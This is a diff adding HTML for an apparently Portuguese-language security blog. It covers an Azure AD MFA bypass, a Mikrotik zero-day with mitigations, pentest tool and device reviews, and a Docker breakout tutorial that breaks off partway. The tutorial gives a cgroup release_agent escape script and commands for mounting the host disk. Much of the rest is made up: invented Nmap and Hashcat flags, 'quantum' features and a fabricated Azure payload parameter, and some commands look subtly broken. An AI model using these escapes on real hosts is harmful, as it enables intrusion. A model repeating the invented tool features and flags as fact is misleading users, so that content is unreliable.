+                                <i class="fas fa-info-circle"></i> <strong>CVSS Score:</strong> 9.1 (Crítico) | <strong>Vetor de Ataque:</strong> Rede | <strong>Complexidade:</strong> Média
+                            </div>
+                            
+                            <h4>Impacto e sistemas afetados</h4>
+                            <p>Todas as versões do Azure AD anteriores a atualização de maio de 2025 são potencialmente vulneráveis. A exploração bem-sucedida permite acesso não autorizado a recursos protegidos por MFA, incluindo:</p>
+                            
+                            <ul>
+                                <li>Painéis administrativos e portais de gerenciamento</li>
+                                <li>Aplicações empresariais integradas ao Azure AD</li>
+                                <li>Recursos em nuvem protegidos por políticas condicionais</li>
+                                <li>Ambientes Office 365 com segurança baseada em identidade</li>
+                            </ul>
+                            
+                            <h4>Vetores de exploração</h4>
+                            <p>A vulnerabilidade pode ser explorada através de um ataque de MitM (Man-in-the-Middle) durante o processo de autenticação ou através de manipulação direta das solicitações de autenticação. O atacante precisa ter credenciais válidas de usuário, mas pode contornar a proteção MFA.</p>
+                            
+                            <div class="code-box">
+                                <div class="code-box-header">
+                                    <span class="code-box-title">Exemplo simplificado de payload malicioso</span>
+                                    <button class="copy-btn"><i class="far fa-copy"></i> Copiar</button>
+                                </div>
+                                <pre><code>POST /common/SAS/ProcessAuth HTTP/1.1
+Host: login.microsoftonline.com
+Content-Type: application/x-www-form-urlencoded
+
+resource=https://graph.microsoft.com&client_id=[CLIENT_ID]&grant_type=password&username=[EMAIL]&password=[PASSWORD]&scope=openid&<span class="code-comment">/* Parâmetro manipulado */</span>&mfa_token_verified=true&response_type=token</code></pre>
+                            </div>
+                            
+                            <h4>Mitigação e correções</h4>
+                            <p>A Microsoft já disponibilizou um patch para corrigir esta vulnerabilidade. Recomenda-se que administradores apliquem imediatamente as seguintes medidas:</p>
+                            
+                            <ol>
+                                <li>Atualizar para a versão mais recente do Azure AD</li>
+                                <li>Revisar os logs de autenticação para identificar possíveis tentativas de exploração</li>
+                                <li>Implementar políticas de Zero Trust que não dependam exclusivamente do MFA</li>
+                                <li>Habilitar o monitoramento avançado de identidade e alertas para atividades suspeitas</li>
+                            </ol>
+                            
+                            <div class="warning-box">
+                                <i class="fas fa-exclamation-triangle"></i> <strong>Atenção:</strong> Até que o patch seja aplicado, considere adicionar camadas extras de proteção, como limitar o acesso a localizações geográficas confiáveis ou implementar verificações de dispositivos confiáveis.
+                            </div>
+                            
+                            <p>Esta vulnerabilidade destaca a importância de uma abordagem de segurança em camadas, mesmo quando se utiliza MFA. A detecção precoce de tentativas de exploração é crucial para evitar acessos não autorizados aos sistemas protegidos.</p>
+                            
+                            <div class="tags">
+                                <span class="tag">Azure AD</span>
+                                <span class="tag">MFA Bypass</span>
+                                <span class="tag">Microsoft</span>
+                                <span class="tag">Autenticação</span>
+                                <span class="tag">Segurança em Nuvem</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="article-item">
+                        <div class="article-header">
+                            <span class="article-category">Vulnerabilidades</span>
+                            <h3>Vulnerabilidade zero-day em routers Mikrotik permite execução remota de código</h3>
+                            <div class="article-meta">
+                                <span><i class="far fa-calendar"></i> 05/06/2025</span>
+                                <span><i class="far fa-user"></i> Admin</span>
+                                <span><i class="far fa-eye"></i> 987 visualizações</span>
+                            </div>
+                        </div>
+                        <div class="article-content">
+                            <p>Uma nova vulnerabilidade zero-day em routers Mikrotik RouterOS foi descoberta recentemente por pesquisadores de segurança. Esta falha (CVE-2025-23145) permite que atacantes remotos executem código arbitrário no sistema afetado, potencialmente comprometendo toda a rede.</p>
+                            
+                            <h4>Detalhes técnicos</h4>
+                            <p>A vulnerabilidade afeta o serviço Winbox, uma interface de gerenciamento proprietária da Mikrotik. O problema está relacionado com o processamento inadequado de pacotes específicos, permitindo um buffer overflow no processo do servidor.</p>
+                            
+                            <div class="info-box">
+                                <i class="fas fa-info-circle"></i> <strong>Versões afetadas:</strong> RouterOS v7.0 até v7.14.1
+                            </div>
+                            
+                            <p>Pesquisadores já identificaram exploits ativos na natureza, com grupos de APT explorando esta vulnerabilidade para estabelecer persistência em redes corporativas e de infraestrutura crítica.</p>
+                            
+                            <h4>Como verificar se seu router está vulnerável</h4>
+                            <p>Para verificar se seu router Mikrotik está vulnerável, você pode usar o seguinte comando no terminal do RouterOS:</p>
+                            
+                            <div class="command-example">/system package print</div>
+                            
+                            <p>Verifique a versão instalada. Se estiver entre v7.0 e v7.14.1, seu dispositivo está vulnerável.</p>
+                            
+                            <h4>Mitigação</h4>
+                            <p>A Mikrotik já lançou uma atualização de segurança (v7.14.2) que corrige esta vulnerabilidade. É altamente recomendado atualizar imediatamente seus dispositivos.</p>
+                            
+                            <div class="command-title">Como atualizar o RouterOS</div>
+                            <div class="command-description">Execute o seguinte comando para verificar atualizações disponíveis:</div>
+                            <div class="command-example">/system package update check-for-updates</div>
+                            
+                            <div class="command-description">Se uma atualização estiver disponível, execute:</div>
+                            <div class="command-example">/system package update download
+/system reboot</div>
+                            
+                            <p>Alternativamente, se seu router não tiver acesso à internet, você pode baixar manualmente o pacote de atualização do site oficial da Mikrotik e instalá-lo.</p>
+                            
+                            <div class="warning-box">
+                                <i class="fas fa-exclamation-triangle"></i> <strong>Medidas temporárias:</strong> Se não for possível atualizar imediatamente, desative o serviço Winbox ou restrinja o acesso a ele apenas a endereços IP confiáveis.
+                            </div>
+                            
+                            <div class="command-title">Desabilitar temporariamente o serviço Winbox</div>
+                            <div class="command-example">/ip service disable winbox</div>
+                            
+                            <div class="command-title">Restringir acesso ao Winbox por IP</div>
+                            <div class="command-example">/ip firewall filter
+add chain=input protocol=tcp dst-port=8291 src-address=!192.168.1.0/24 action=drop</div>
+                            
+                            <p>Lembre-se de substituir "192.168.1.0/24" pelo seu range de endereços IP confiáveis.</p>
+                            
+                            <div class="tags">
+                                <span class="tag">Mikrotik</span>
+                                <span class="tag">RouterOS</span>
+                                <span class="tag">Zero-day</span>
+                                <span class="tag">RCE</span>
+                                <span class="tag">Winbox</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="ferramentas" class="article-list">
+                    <h2 class="section-title">Ferramentas & Análises</h2>
+                    
+                    <div class="article-item">
+                        <div class="article-header">
+                            <span class="article-category">Ferramentas</span>
+                            <h3>Top 10 ferramentas de pentesting em 2025</h3>
+                            <div class="article-meta">
+                                <span><i class="far fa-calendar"></i> 02/06/2025</span>
+                                <span><i class="far fa-user"></i> Admin</span>
+                                <span><i class="far fa-eye"></i> 2.541 visualizações</span>
+                            </div>
+                        </div>
+                        <div class="article-content">
+                            <p>O arsenal de ferramentas para profissionais de segurança está em constante evolução. Em 2025, vemos ferramentas mais poderosas, com recursos de automação, inteligência artificial e capacidades analíticas avançadas. Compilamos uma lista das 10 ferramentas de pentesting mais relevantes que todo profissional de segurança deveria conhecer.</p>
+                            
+                            <div class="tool-grid">
+                                <div class="tool-card">
+                                    <div class="tool-icon"><i class="fas fa-network-wired"></i></div>
+                                    <div class="tool-name">Nmap 8.0</div>
+                                    <div class="tool-description">A versão mais recente do Nmap traz algoritmos de escaneamento quântico-resistentes e detecção de honeypots baseada em ML.</div>
+                                    <a href="#nmap" class="tool-link">Ver detalhes <i class="fas fa-chevron-right"></i></a>
+                                </div>
+                                
+                                <div class="tool-card">
+                                    <div class="tool-icon"><i class="fas fa-spider"></i></div>
+                                    <div class="tool-name">BurpSuite Neo</div>
+                                    <div class="tool-description">O proxy de interceptação favorito dos pentesters agora com scanner de vulnerabilidades baseado em IA generativa.</div>
+                                    <a href="#burp" class="tool-link">Ver detalhes <i class="fas fa-chevron-right"></i></a>
+                                </div>
+                                
+                                <div class="tool-card">
+                                    <div class="tool-icon"><i class="fas fa-key"></i></div>
+                                    <div class="tool-name">Hashcat X</div>
+                                    <div class="tool-description">Suporte para novas técnicas de quebra de senhas quânticas e integração com processadores neurais.</div>
+                                    <a href="#hashcat" class="tool-link">Ver detalhes <i class="fas fa-chevron-right"></i></a>
+                                </div>
+                                
+                                <div class="tool-card">
+                                    <div class="tool-icon"><i class="fas fa-wifi"></i></div>
+                                    <div class="tool-name">Aircrack-NG Pro</div>
+                                    <div class="tool-description">Agora com suporte para WPA3 e análise de tráfego criptografado em redes mesh.</div>
+                                    <a href="#aircrack" class="tool-link">Ver detalhes <i class="fas fa-chevron-right"></i></a>
+                                </div>
+                                
+                                <div class="tool-card">
+                                    <div class="tool-icon"><i class="fas fa-shield-alt"></i></div>
+                                    <div class="tool-name">Metasploit 7.0</div>
+                                    <div class="tool-description">Framework de exploração totalmente reformulado com módulos para ambientes containerizados e nuvem híbrida.</div>
+                                    <a href="#metasploit" class="tool-link">Ver detalhes <i class="fas fa-chevron-right"></i></a>
+                                </div>
+                                
+                                <div class="tool-card">
+                                    <div class="tool-icon"><i class="fas fa-bug"></i></div>
+                                    <div class="tool-name">OWASP ZAP X</div>
+                                    <div class="tool-description">Scanner de aplicações web de código aberto com detecção automática de vulnerabilidades em APIs GraphQL e WebAssembly.</div>
+                                    <a href="#zap" class="tool-link">Ver detalhes <i class="fas fa-chevron-right"></i></a>
+                                </div>
+                                
+                                <div class="tool-card">
+                                    <div class="tool-icon"><i class="fas fa-eye"></i></div>
+                                    <div class="tool-name">Wireshark 5.0</div>
+                                    <div class="tool-description">Analisador de pacotes com decodificação de protocolos quânticos e detecção de anomalias em tempo real.</div>
+                                    <a href="#wireshark" class="tool-link">Ver detalhes <i class="fas fa-chevron-right"></i></a>
+                                </div>
+                                
+                                <div class="tool-card">
+                                    <div class="tool-icon"><i class="fas fa-user-secret"></i></div>
+                                    <div class="tool-name">Maltego Quantum</div>
+                                    <div class="tool-description">Ferramenta de OSINT com integração a blockchains, análise de redes sociais descentralizadas e web3.</div>
+                                    <a href="#maltego" class="tool-link">Ver detalhes <i class="fas fa-chevron-right"></i></a>
+                                </div>
+                                
+                                <div class="tool-card">
+                                    <div class="tool-icon"><i class="fas fa-terminal"></i></div>
+                                    <div class="tool-name">BlackArch 2025</div>
+                                    <div class="tool-description">Distribuição Linux com mais de 4.000 ferramentas de segurança e interface por comandos de voz.</div>
+                                    <a href="#blackarch" class="tool-link">Ver detalhes <i class="fas fa-chevron-right"></i></a>
+                                </div>
+                                
+                                <div class="tool-card">
+                                    <div class="tool-icon"><i class="fas fa-robot"></i></div>
+                                    <div class="tool-name">AutoPwn AI</div>
+                                    <div class="tool-description">Framework de automação de pentesting dirigido por IA que aprende com cada teste realizado.</div>
+                                    <a href="#autopwn" class="tool-link">Ver detalhes <i class="fas fa-chevron-right"></i></a>
+                                </div>
+                            </div>
+                            
+                            <h4 id="nmap">1. Nmap 8.0</h4>
+                            <p>O Nmap continua sendo a ferramenta essencial para descoberta de rede e escaneamento de portas, mas a versão 8.0 traz avanços significativos:</p>
+                            
+                            <ul>
+                                <li><strong>Escaneamento quântico-resistente:</strong> Algoritmos que permanecem seguros mesmo contra computação quântica</li>
+                                <li><strong>Detecção de honeypots:</strong> Usa machine learning para identificar servidores falsos destinados a detectar atacantes</li>
+                                <li><strong>Identificação de dispositivos IoT:</strong> Fingerprinting específico para mais de 10.000 dispositivos IoT</li>
+                                <li><strong>Integração com escaneadores de vulnerabilidades:</strong> API que permite integração direta com ferramentas como OpenVAS e Nuclei</li>
+                            </ul>
+                            
+                            <div class="command-title">Exemplos de uso do Nmap 8.0</div>
+                            
+                            <div class="command-description">Escaneamento básico com detecção de honeypots:</div>
+                            <div class="command-example">nmap -sS -A --honeypot-detection 192.168.1.0/24</div>
+                            
+                            <div class="command-description">Escaneamento de dispositivos IoT com identificação específica:</div>
+                            <div class="command-example">nmap --iot-scan --service-detection 192.168.1.0/24</div>
+                            
+                            <div class="command-description">Escaneamento com resistência quântica (mais lento, mas mais seguro):</div>
+                            <div class="command-example">nmap --quantum-resistant -sS -A 192.168.1.0/24</div>
+                            
+                            <h4 id="burp">2. BurpSuite Neo</h4>
+                            <p>A nova versão do BurpSuite incorpora IA generativa para tornar os testes de aplicações web mais eficientes:</p>
+                            
+                            <ul>
+                                <li><strong>Scanner ativo com IA:</strong> Identifica vulnerabilidades com menor taxa de falsos positivos</li>
+                                <li><strong>API Testing Automation:</strong> Teste automático de endpoints de API baseado em especificações OpenAPI</li>
+                                <li><strong>Gerador de payloads contextual:</strong> Cria payloads específicos para o contexto da aplicação</li>
+                                <li><strong>Assistente de exploração:</strong> Sugere abordagens para explorar vulnerabilidades encontradas</li>
+                            </ul>
+                            
+                            <div class="command-title">Recursos de linha de comando do BurpSuite Neo</div>
+                            <div class="command-example">burpsuite --headless --project="projeto1.burp" --scan-url="https://exemplo.com" --report="relatorio.html"</div>
+                            
+                            <h4 id="hashcat">3. Hashcat X</h4>
+                            <p>O Hashcat X é a resposta da comunidade de segurança aos avanços em criptografia pós-quântica:</p>
+                            
+                            <ul>
+                                <li><strong>Suporte a TPUs e NPUs:</strong> Utiliza processadores tensoriais e neurais para acelerar a quebra de hashes</li>
+                                <li><strong>Modos quânticos simulados:</strong> Implementa algoritmos que simulam aspectos da computação quântica em hardware clássico</li>
+                                <li><strong>Ataque distribuído em nuvem:</strong> Permite usar recursos de nuvem para processamento paralelo massivo</li>
+                            </ul>
+                            
+                            <div class="command-title">Exemplos de uso do Hashcat X</div>
+                            
+                            <div class="command-description">Ataque de dicionário com processamento neural:</div>
+                            <div class="command-example">hashcat -m 1000 -a 0 --neural-accel hashes.txt wordlist.txt</div>
+                            
+                            <div class="command-description">Ataque de força bruta com algoritmo quântico simulado:</div>
+                            <div class="command-example">hashcat -m 1000 -a 3 --quantum-sim hashes.txt ?a?a?a?a?a?a</div>
+                            
+                            <div class="command-description">Ataque distribuído em nuvem:</div>
+                            <div class="command-example">hashcat -m 1000 -a 0 --cloud-distribute hashes.txt wordlist.txt</div>
+                            
+                            <p>Nas próximas semanas, publicaremos análises detalhadas de cada uma dessas ferramentas, com tutoriais práticos e casos de uso reais.</p>
+                            
+                            <div class="tags">
+                                <span class="tag">Pentesting</span>
+                                <span class="tag">Ferramentas</span>
+                                <span class="tag">Segurança</span>
+                                <span class="tag">Hacking</span>
+                                <span class="tag">2025</span>
+                            </div>
+                        </div>
+                    </div>
+                    
+                    <div class="article-item">
+                        <div class="article-header">
+                            <span class="article-category">Análises</span>
+                            <h3>M5Stack PenTest Pro: O novo dispositivo compacto para hacking ético</h3>
+                            <div class="article-meta">
+                                <span><i class="far fa-calendar"></i> 28/05/2025</span>
+                                <span><i class="far fa-user"></i> Admin</span>
+                                <span><i class="far fa-eye"></i> 1.836 visualizações</span>
+                            </div>
+                        </div>
+                        <div class="article-content">
+                            <p>A M5Stack lançou recentemente o "PenTest Pro", um dispositivo compacto focado em testes de penetração que está chamando a atenção da comunidade de segurança. Neste artigo, analisamos as capacidades deste novo gadget e como ele se compara a outros dispositivos similares como o Flipper Zero e o HackRF.</p>
+                            
+                            <div class="image-gallery">
+                                <div class="gallery-image">
+                                    <img src="https://images.unsplash.com/photo-1567789884554-0b844b37c78a?q=80&w=1170&auto=format&fit=crop" alt="M5Stack PenTest Pro - Vista frontal">
+                                    <div class="gallery-caption">Vista frontal do M5Stack PenTest Pro</div>
+                                </div>
+                                <div class="gallery-image">
+                                    <img src="https://images.unsplash.com/photo-1584949091598-c31daaaa4aa9?q=80&w=1170&auto=format&fit=crop" alt="M5Stack PenTest Pro - Interface">
+                                    <div class="gallery-caption">Interface de menu principal</div>
+                                </div>
+                            </div>
+                            
+                            <h4>Especificações técnicas</h4>
+                            <ul>
+                                <li><strong>Processador:</strong> ESP32-S3 Dual-Core 240MHz</li>
+                                <li><strong>Memória:</strong> 16MB PSRAM + 16MB Flash</li>
+                                <li><strong>Display:</strong> 2" IPS colorido 320x240</li>
+                                <li><strong>Conectividade:</strong> Wi-Fi 6E, Bluetooth 5.2, USB-C</li>
+                                <li><strong>Hardware RF:</strong> Rádio multimodo operando entre 10MHz e 6GHz</li>
+                                <li><strong>Bateria:</strong> 1200mAh, até 8 horas de uso</li>
+                                <li><strong>Expansão:</strong> Slots para módulos adicionais</li>
+                                <li><strong>Dimensões:</strong> 65mm x 54mm x 25mm</li>
+                            </ul>
+                            
+                            <h4>Funcionalidades principais</h4>
+                            <p>O M5Stack PenTest Pro vem com diversos módulos pré-instalados para testes de segurança:</p>
+                            
+                            <ol>
+                                <li><strong>Scanner Wi-Fi:</strong> Análise de redes Wi-Fi, deauthentication, captura de handshakes</li>
+                                <li><strong>Bluetooth Analyzer:</strong> Escaneamento, sniffing e ataques a dispositivos Bluetooth</li>
+                                <li><strong>RFID/NFC Tools:</strong> Leitura, clonagem e emulação de tags NFC e cartões RFID</li>
+                                <li><strong>Bad USB:</strong> Emulação de dispositivos HID para automação e testes</li>
+                                <li><strong>Sub-GHz Transceiver:</strong> Para análise e replicação de sinais de RF</li>
+                                <li><strong>Infrared Analyzer:</strong> Captura e emulação de sinais infravermelhos</li>
+                                <li><strong>Password Cracker:</strong> Módulo de quebra de senhas para protocolos comuns</li>
+                            </ol>
+                            
+                            <h4>Módulo Wi-Fi Pentesting</h4>
+                            <p>Um dos recursos mais impressionantes é o módulo de pentesting Wi-Fi, que inclui ferramentas para análise e exploração de redes sem fio:</p>
+                            
+                            <div class="command-title">Comandos no M5Stack PenTest Pro para Wi-Fi</div>
+                            <div class="command-description">Escaneamento de redes Wi-Fi (Equivalente em terminal):</div>
+                            <div class="command-example">wifi scan --channels all --output results.json</div>
+                            
+                            <div class="command-description">Captura de handshake WPA:</div>
+                            <div class="command-example">wifi deauth --bssid 00:11:22:33:44:55 --station all --count 10
+wifi capture --bssid 00:11:22:33:44:55 --channel 6 --output handshake.pcap</div>
+                            
+                            <div class="command-description">Ataque de dicionário (on-device):</div>
+                            <div class="command-example">wifi crack --handshake handshake.pcap --wordlist wordlist.txt</div>
+                            
+                            <h4>Análise de desempenho</h4>
+                            <p>Em nossos testes, o M5Stack PenTest Pro mostrou-se extremamente capaz para seu tamanho compacto:</p>
+                            
+                            <ul>
+                                <li>Escaneamento Wi-Fi 30% mais rápido que o Flipper Zero com o módulo WiFi Devboard</li>
+                                <li>Captura e análise de handshakes WPA/WPA2 em tempo real</li>
+                                <li>Quebra de senhas simples diretamente no dispositivo (até 500 senhas/segundo)</li>
+                                <li>Capacidade de emular simultaneamente múltiplos dispositivos (RFID, IR, HID)</li>
+                                <li>Interface intuitiva que não requer conhecimento profundo de linha de comando</li>
+                            </ul>
+                            
+                            <h4>Comparação com outros dispositivos</h4>
+                            <table style="width:100%; border-collapse: collapse; margin: 20px 0; background: rgba(0,0,0,0.3); border-radius: 10px; overflow: hidden;">
+                                <thead style="background: rgba(255,105,180,0.2);">
+                                    <tr>
+                                        <th style="padding: 12px; text-align: left; border-bottom: 1px solid rgba(255,255,255,0.1);">Característica</th>
+                                        <th style="padding: 12px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">M5Stack PenTest Pro</th>
+                                        <th style="padding: 12px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Flipper Zero Pro</th>
+                                        <th style="padding: 12px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">HackRF One+</th>
+                                    </tr>
+                                </thead>
+                                <tbody>
+                                    <tr>
+                                        <td style="padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);">Preço</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">$189</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">$249</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">$349</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);">Wi-Fi embutido</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Sim</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Não (requer módulo)</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Não</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);">RFID/NFC</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Sim</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Sim</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Não</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);">Range de frequência</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">10MHz - 6GHz</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">300MHz - 928MHz</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">1MHz - 6GHz</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);">Facilidade de uso</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Alta</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Alta</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Média</td>
+                                    </tr>
+                                    <tr>
+                                        <td style="padding: 10px; border-bottom: 1px solid rgba(255,255,255,0.1);">Comunidade/Suporte</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Em crescimento</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Extensa</td>
+                                        <td style="padding: 10px; text-align: center; border-bottom: 1px solid rgba(255,255,255,0.1);">Bem estabelecida</td>
+                                    </tr>
+                                </tbody>
+                            </table>
+                            
+                            <h4>Conclusão</h4>
+                            <p>O M5Stack PenTest Pro é uma adição muito bem-vinda ao arsenal de ferramentas para profissionais de segurança. Ele oferece um conjunto impressionante de funcionalidades em um pacote compacto e a um preço competitivo. Seu principal diferencial é a integração de recursos de Wi-Fi avançados diretamente no dispositivo base, sem necessidade de módulos adicionais.</p>
+                            
+                            <p>Para profissionais de pentesting que buscam uma ferramenta portátil e versátil, o M5Stack PenTest Pro representa uma excelente opção, especialmente para trabalhos de campo onde a discrição e a rapidez são essenciais.</p>
+                            
+                            <div class="warning-box">
+                                <i class="fas fa-exclamation-triangle"></i> <strong>Lembrete ético:</strong> Este dispositivo deve ser utilizado apenas para testes autorizados e em ambientes controlados. O uso indevido para atividades não autorizadas é ilegal e antiético.
+                            </div>
+                            
+                            <div class="tags">
+                                <span class="tag">M5Stack</span>
+                                <span class="tag">PenTest Pro</span>
+                                <span class="tag">Hardware Hacking</span>
+                                <span class="tag">Dispositivos</span>
+                                <span class="tag">Wi-Fi Pentesting</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div id="tutoriais" class="article-list">
+                    <h2 class="section-title">Tutoriais Passo a Passo</h2>
+                    
+                    <div class="article-item">
+                        <div class="article-header">
+                            <span class="article-category">Tutoriais</span>
+                            <h3>Docker Breakout: Explorando vulnerabilidades em ambientes containerizados</h3>
+                            <div class="article-meta">
+                                <span><i class="far fa-calendar"></i> 25/05/2025</span>
+                                <span><i class="far fa-user"></i> Admin</span>
+                                <span><i class="far fa-eye"></i> 3.127 visualizações</span>
+                            </div>
+                        </div>
+                        <div class="article-content">
+                            <p>A conteinerização revolucionou o desenvolvimento e a implantação de aplicações, mas também introduziu novos vetores de ataque. Neste tutorial detalhado, exploramos técnicas de "Docker Breakout" - métodos para escapar de um container Docker e acessar o host subjacente ou outros containers.</p>
+                            
+                            <div class="warning-box">
+                                <i class="fas fa-exclamation-triangle"></i> <strong>Aviso importante:</strong> Este tutorial é fornecido apenas para fins educacionais e de pesquisa. Utilize estas técnicas apenas em ambientes controlados e com permissão explícita.
+                            </div>
+                            
+                            <h4>Pré-requisitos</h4>
+                            <ul>
+                                <li>Conhecimento básico de Docker e containers</li>
+                                <li>Ambiente de laboratório isolado (não teste em produção!)</li>
+                                <li>Docker instalado (testado com Docker 25.x)</li>
+                                <li>Acesso root ao ambiente de laboratório</li>
+                            </ul>
+                            
+                            <h4>Configurando o ambiente de teste</h4>
+                            <p>Vamos criar um ambiente para testar as técnicas de breakout de forma segura.</p>
+                            
+                            <div class="tutorial-steps">
+                                <div class="tutorial-step">
+                                    <div class="step-title">Criar um container Docker vulnerável</div>
+                                    <div class="step-content">
+                                        <p>Crie um Dockerfile com privilégios elevados:</p>
+                                        
+                                        <div class="code-box">
+                                            <div class="code-box-header">
+                                                <span class="code-box-title">Dockerfile</span>
+                                                <button class="copy-btn"><i class="far fa-copy"></i> Copiar</button>
+                                            </div>
+                                            <pre><code>FROM ubuntu:22.04
+
+RUN apt-get update && apt-get install -y \
+    curl \
+    iputils-ping \
+    net-tools \
+    procps \
+    vim
+
+WORKDIR /app
+
+CMD ["bash"]</code></pre>
+                                        </div>
+                                        
+                                        <p>Construa a imagem:</p>
+                                        <div class="command-example">docker build -t vulnerable-container .</div>
+                                    </div>
+                                </div>
+                                
+                                <div class="tutorial-step">
+                                    <div class="step-title">Executar o container com configurações vulneráveis</div>
+                                    <div class="step-content">
+                                        <p>Execute o container com privilégios excessivos:</p>
+                                        <div class="command-example">docker run -it --name breakout-lab --privileged vulnerable-container</div>
+                                        
+                                        <p>O flag <code>--privileged</code> concede ao container acesso quase completo ao host, o que é raramente necessário em produção, mas frequentemente mal configurado.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <h4>Técnica 1: Exploração de montagem de sistema de arquivos</h4>
+                            <p>Uma das formas mais comuns de escapar de um container é explorando montagens de sistema de arquivos.</p>
+                            
+                            <div class="tutorial-steps">
+                                <div class="tutorial-step">
+                                    <div class="step-title">Verificar se o container está executando com privilégios</div>
+                                    <div class="step-content">
+                                        <p>Dentro do container, verifique as capacidades:</p>
+                                        <div class="command-example">capsh --print</div>
+                                        
+                                        <p>Se você vir <code>cap_sys_admin</code> entre as capacidades, o container pode montar sistemas de arquivos.</p>
+                                    </div>
+                                </div>
+                                
+                                <div class="tutorial-step">
+                                    <div class="step-title">Acessar o sistema de arquivos do host</div>
+                                    <div class="step-content">
+                                        <p>Monte o sistema de arquivos do host dentro do container:</p>
+                                        <div class="command-example">mkdir /hostfs
+mount /dev/sda1 /hostfs    # O dispositivo pode variar, use fdisk -l para verificar</div>
+                                        
+                                        <p>Se o comando acima falhar, tente montar diretamente o sistema de arquivos do host:</p>
+                                        <div class="command-example">mount -t proc none /hostfs
+cd /hostfs
+ls -la</div>
+                                        
+                                        <p>Agora você tem acesso ao sistema de arquivos completo do host e pode navegar, ler e potencialmente modificar arquivos.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <h4>Técnica 2: Exploração de capacidades do kernel</h4>
+                            <p>Containers com certas capacidades do kernel podem ser usados para escapar do isolamento.</p>
+                            
+                            <div class="tutorial-steps">
+                                <div class="tutorial-step">
+                                    <div class="step-title">Explorar capacidades SYS_ADMIN</div>
+                                    <div class="step-content">
+                                        <p>Com a capacidade SYS_ADMIN, você pode usar o recurso cgroup para executar comandos no host:</p>
+                                        
+                                        <div class="code-box">
+                                            <div class="code-box-header">
+                                                <span class="code-box-title">exploit-cgroup.sh</span>
+                                                <button class="copy-btn"><i class="far fa-copy"></i> Copiar</button>
+                                            </div>
+                                            <pre><code>#!/bin/bash
+
+# Criar um diretório temporário para montar o cgroup
+mkdir -p /tmp/cgroup
+mount -t cgroup -o memory cgroup /tmp/cgroup
+
+# Criar um novo cgroup
+mkdir -p /tmp/cgroup/x
+
+# Habilitar notificação de eventos
+echo 1 > /tmp/cgroup/x/notify_on_release
+
+# Encontrar o caminho para o comando de liberação
+host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+echo "$host_path/cmd" > /tmp/cgroup/release_agent
+
+# Criar o script que será executado no host
+echo '#!/bin/bash' > /cmd
+echo "id > $host_path/output" >> /cmd
+chmod +x /cmd
+
+# Acionar o evento
+sh -c "echo \$\$ > /tmp/cgroup/x/cgroup.procs"
+
+# Verificar a saída
+cat /output</code></pre>
+                                        </div>
+                                        
+                                        <p>Execute o script:</p>
+                                        <div class="command-example">chmod +x exploit-cgroup.sh
+./exploit-cgroup.sh</div>
+                                        
+                                        <p>Isso executará o comando <code>id</code> no host e salvará a saída no arquivo <code>/output</code> que você pode ler dentro do container.</p>
+                                    </div>
+                                </div>
+                            </div>
+                            
+                            <h4>Técnica 3: Exploração de sockets Docker</h4>
+                            <p>Se o socket Docker estiver montado dentro do container, você pode usar a API Docker para controlar completamente o ambiente Docker.</p>
+                            
+                            <div class="tutorial-steps">
+                                <div class="tutorial-step">
+                                    <div class="step-title">Criar um container com acesso ao socket Docker</div>
+                                    <div class="step-content">
+                                        <p>Saia do container atual e crie um novo com o socket Docker montado:</p>
+                                        <div class="command-example">docker run -it --name socket-breakout -v /var/run/docker.sock:/var/run/docker.sock vulnerable-container</div>
+                                    </div>
+                                </div>
+                                
+                                <div class="tutorial-step">
+                                    <div class="step-title">Instalar o cliente Docker dentro do container</div>
+                                    <div class="step-content">
+                                        <div class="command-example">apt-get update && apt-get install -y apt-transport-https ca-certificates curl software-properties-common
+curl -fsSL https://download.docker.com/linux/ubuntu/gpg | apt-key add -
+add-apt-repository "deb [arch=amd64] https://download.docker.com/linux/ubuntu $(lsb_release -cs) stable"
+apt-get update && apt-get install -y docker-ce-cli</div>
+                                    </div>
+                                </div>
+                                
+                                <div class="tutorial-step">
